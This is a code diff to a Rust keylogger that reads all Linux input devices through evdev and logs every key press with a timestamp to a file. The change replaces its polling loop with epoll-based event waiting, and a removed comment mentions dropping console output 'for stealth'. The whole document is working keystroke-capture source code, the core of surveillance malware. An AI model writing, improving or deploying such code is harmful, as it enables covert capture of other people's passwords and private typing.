@@ -1,12 +1,15 @@
 use evdev::{Device, EventType, InputEventKind, Key};
 use std::fs::OpenOptions;
 use std::io::Write;
+use std::os::unix::io::AsRawFd;
 use chrono::Local;
+use nix::fcntl::{FcntlArg, OFlag};
+use nix::sys::epoll::{self, EpollEvent, EpollFlags, EpollOp};
+use nix::unistd;
 
 pub fn run_keylogger(log_path: &str) {
     // Scan for all input devices
     let devices = evdev::enumerate()
-        .map(|(path, device)| (path, device))
         .collect::<Vec<_>>();
 
     if devices.is_empty() {
@@ -98,49 +101,84 @@ pub fn run_keylogger(log_path: &str) {
         .expect("Failed to write to log file");
     file.flush().expect("Failed to flush log file");
 
+    // Create epoll instance
+    let epoll_fd = epoll::epoll_create1(epoll::EpollCreateFlags::EPOLL_CLOEXEC)
+        .expect("Failed to create epoll instance");
+
+    // Set all devices to non-blocking mode and register them with epoll
+    for (i, (device, _)) in devices_to_monitor.iter().enumerate() {
+        let raw_fd = device.as_raw_fd();
+        
+        // Set non-blocking
+        nix::fcntl::fcntl(raw_fd, FcntlArg::F_SETFL(OFlag::O_NONBLOCK))
+            .expect("Failed to set non-blocking mode");
+        
+        // Register with epoll
+        let mut event = EpollEvent::new(EpollFlags::EPOLLIN, i as u64);
+        epoll::epoll_ctl(epoll_fd, EpollOp::EpollCtlAdd, raw_fd, Some(&mut event))
+            .expect("Failed to register device with epoll");
+    }
+
+    let mut events = [EpollEvent::empty(); 10];
+
     // Main event loop
     loop {
-        for (device, device_name) in &mut devices_to_monitor {
-            // Fetch events (non-blocking)
-            match device.fetch_events() {
-                Ok(events) => {
-                    for event in events {
-                        if event.event_type() == EventType::KEY {
-                            if let InputEventKind::Key(key) = event.kind() {
-                                // Only log key press events (value == 1), not releases (value == 0) or repeats (value == 2)
-                                if event.value() == 1 {
-                                    let key_str = format_key(key);
-                                    let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S%.3f");
-                                    
-                                    let log_entry = format!(
-                                        "[{}] [{}] Key: {}\n",
-                                        timestamp, device_name, key_str
-                                    );
-                                    
-                                    // Write to file
-                                    file.write_all(log_entry.as_bytes())
-                                        .expect("Failed to write to log file");
-                                    file.flush().expect("Failed to flush log file");
-                                    
-                                    // Also print to console (optional, can be removed for stealth)
-                                    print!("{}", key_str);
-                                    std::io::stdout().flush().unwrap();
+        // Wait for events on any device
+        match epoll::epoll_wait(epoll_fd, &mut events, -1) {
+            Ok(nfds) => {
+                // Process events from devices that have data
+                for event in &events[..nfds] {
+                    let device_idx = event.data() as usize;
+                    if device_idx < devices_to_monitor.len() {
+                        let (device, device_name) = &mut devices_to_monitor[device_idx];
+                        
+                        match device.fetch_events() {
+                            Ok(event_iter) => {
+                                for ev in event_iter {
+                                    if ev.event_type() == EventType::KEY {
+                                        if let InputEventKind::Key(key) = ev.kind() {
+                                            // Only log key press events (value == 1), not releases (value == 0) or repeats (value == 2)
+                                            if ev.value() == 1 {
+                                                let key_str = format_key(key);
+                                                let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S%.3f");
+                                                
+                                                let log_entry = format!(
+                                                    "[{}] [{}] Key: {}\n",
+                                                    timestamp, device_name, key_str
+                                                );
+                                                
+                                                // Write to file
+                                                file.write_all(log_entry.as_bytes())
+                                                    .expect("Failed to write to log file");
+                                                file.flush().expect("Failed to flush log file");
+                                                
+                                                // Also print to console
+                                                print!("{}", key_str);
+                                                std::io::stdout().flush().unwrap();
+                                            }
+                                        }
+                                    }
                                 }
+                            }
+                            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
+                                // No more events available from this device right now
+                            }
+                            Err(e) => {
+                                eprintln!("Error reading events from {}: {}", device_name, e);
                             }
                         }
                     }
                 }
-                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
-                    // No events available, this is normal
-                    // Short sleep to prevent busy-waiting while maintaining responsiveness
-                    std::thread::sleep(std::time::Duration::from_millis(1));
-                }
-                Err(e) => {
-                    eprintln!("Error reading events from {}: {}", device_name, e);
-                }
+            }
+            Err(e) => {
+                eprintln!("Error waiting for events: {}", e);
+                break;
             }
         }
     }
+
+    // Cleanup
+    unistd::close(epoll_fd).ok();
 }
 
 fn format_key(key: Key) -> String {
